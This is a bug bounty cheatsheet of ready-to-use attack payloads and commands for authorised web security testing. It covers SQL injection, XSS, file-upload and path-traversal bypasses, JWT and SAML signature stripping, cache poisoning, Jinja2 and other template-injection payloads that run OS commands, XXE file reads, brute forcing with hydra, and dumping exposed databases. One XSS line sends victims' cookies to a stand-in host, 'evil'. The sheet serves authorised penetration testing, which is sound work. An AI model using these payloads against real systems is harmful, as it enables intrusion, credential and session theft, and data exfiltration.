# Cheatsheet — Bug Bounty Playbook V2

> Live-program ceilings are set per chapter (`> **…rule/gate/boundary:**` callouts) — the techniques below are family knowledge, not volume defaults. See `sources.md`.

## Recon → exploit cycle

```
wappalyzer / builtwith → Google "<tech> <ver> exploits" → NVD → ExploitDB/searchsploit
→ GitHub PoC (beware fakes) → local vuln VM test → target
1-day feeds → match verified allowlisted assets → active scanning only with explicit policy permission + allowed rate → minimal confirmation
```

## CMS scanners

```
wpscan --url <URL>                        # WP — check /wp-content/uploads/ listing
python3 droopescan scan drupal -u <URL> -t 32
perl joomscan.pl -u <URL>
python aem_hacker.py -u <URL> --host <PUB_IP>   # AEM ~ instant win
```

## GitHub dorks + takeover

```
<domain> "password" | "api_key" | ".env" | "secret" | "token"
dig sub.target.com → CNAME dead? → can-i-take-over-xyz → claim
```

## Exposed DBs

```
<name>.firebaseio.com/.json               # firebase dump
curl http://<ip>:9200/_cat/indices?v      # ES indexes
GET /_all/_search?q=password              # ES full-text
GET /INDEX/_mapping?pretty=1              # ES field names
mongo <ip>:27017                          # mongo no-auth
```

## Brute force

```
SecLists/Passwords/Default-Credentials    # vendor defaults first
hydra -l user -P list <ip> <service>      # ssh/ftp/rdp/vnc/http-form
```

## SQLi quick-fire

```
' " %27                                   # detect + fingerprint
order by N                                # column count
union all select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()   -- MySQL
AND extractvalue("x",(select concat(";",col) from users limit 0,1))                                        -- MySQL error
union all select null,table_name from information_schema.tables where table_schema!='pg_catalog' offset 0  -- Postgres
select banner from v$version              -- Oracle (needs FROM dual)
LISTAGG(col,',') within group (ORDER BY col) from all_tables                                               -- Oracle concat
```

## XSS

```
<script>alert(0)</script>                 # text context
"><script>alert(0)</script>               # attribute breakout
" onfocus=alert(0) autofocus="            # <> encoded → event attr
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A//…   # polyglot
<script>document.location='http://evil/x?c='+document.cookie</script>  # impact PoC
DOM: location.hash → eval/innerHTML sinks
```

## Upload / traversal / redirect / IDOR

```
shell.php → Content-Type: image/jpeg      # CT bypass
.phpt .phtml .php5 .pht .php.jpg          # ext blacklist bypass
?page=../../../../etc/passwd              # traversal
?url=https://google.com                   # redirect test
userId=7 → md5("8") …                     # IDOR + hashed-id guess
```

## API

```
/graphql?query={__schema{types{name,fields{name}}}}   # introspection
/graphql?query={User{username,password}}              # data pull
methodCall/methodName → RPC;  <soapenv:Envelope> → SOAP; JSON+PUT/PATCH → REST
?wsdl → SoapUI;  *.wadl → Postman;  /swagger-ui.html /swagger/v1/swagger.json
swagger ?url=<script>…  / ?url=https://evil/x.json    # swagger XSS
```

## JWT

```
strip signature → send
{"alg":"none"} + empty sig
hashcat/jwtcat crack HS256 secret
RS256→HS256: sign with server's PUBLIC key as HMAC secret
```

## SAML

```
<ds:SignatureValue></ds:SignatureValue>   # blank it
delete <ds:Signature> block               # remove it
admin<!--x-->@gmail.com                   # comment injection
SAML Raider → Apply XSW1..XSW8            # wrapping attacks
```

## Cache

```
Param Miner → unkeyed header/param (e.g. X-Forwarded-Scheme)
?cachebust=N → X-Cache: miss → inject payload in unkeyed input → poisoned shared cache
/users/me/nonexistent.css | %0A.css | %3B.css | %23.css | %3f.css   # deception probes
```

## SSTI detect → RCE

```
{{7*7}} {{7*'7'}} ${7*7} <%= 7*7 %>       # detect + fingerprint
{{[].__class__.__mro__[1].__subclasses__()}}                 # Jinja2 enumerate
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}  # Jinja2 RCE
{% import os %}{{os.popen('id').read()}}                     # Tornado
<%= `id` %>  /  #{ `id` }                                    # ERB / Slim
${"freemarker.template.utility.Execute"?new()("id")}         # Freemarker
```

## XXE

```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<productId>&xxe;</productId>
```

## CSP red flags

```
default-src 'self' *                      # wildcard = no policy
script-src 'unsafe-inline' 'unsafe-eval' data:  # free XSS
script-src <host-with-JSONP-callback>     # JSONP bypass
input reflected inside CSP header         # inject your domain
```
